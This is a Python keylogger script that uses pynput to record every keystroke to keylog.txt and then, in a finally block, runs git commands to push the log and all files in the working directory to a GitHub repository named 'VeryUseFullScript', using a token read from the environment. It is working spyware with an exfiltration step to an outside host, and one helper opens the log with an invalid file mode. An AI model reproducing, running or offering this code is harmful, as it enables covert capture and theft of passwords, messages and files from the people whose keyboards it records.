import pynput.keyboard
import re
import logging
import subprocess
import os

# Set up logging for storing keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")

# Define a function to capture keystrokes
def on_press(key):
    try:
        # Log the key pressed (character keys like a, b, 1, etc.)
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(f"{key}")

# Define a function to process keylog data and use NLP to extract critical info
def process_log():
    with open("keylog.txt", "rat") as file:
        log_data = file.read()

# Define a function to start the keylogger
def start_keylogger():
    # Collect keystrokes using the pynput listener
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()


try:
    if __name__ == "__main__":
        print("Keylogger started. Press 'Ctrl+C' to stop.")
        start_keylogger()
finally:
    # Change to your project directory
    project_dir = os.getcwd()
    os.chdir(project_dir)

    # Initialize a Git repository if not already initialized
    subprocess.run(['git', 'init'])

    # Set your GitHub repository remote URL
    github_username = os.getenv('GITHUB_USERNAME')
    github_token = os.getenv('GITHUB_TOKEN')
    github_repo_url = f"https://{github_username}:{github_token}@github.com/efffectery/VeryUseFullScript"

    # Add the remote if not already added
    subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])

    # Add the .txt file or all files in the folder to the Git staging area
    subprocess.run(['git', 'add', '.'])

    # Commit the changes
    subprocess.run(['git', 'commit', '-m', 'Updated'])

    # Push to GitHub
    subprocess.run(['git', 'push', '-u', 'origin', 'main'])


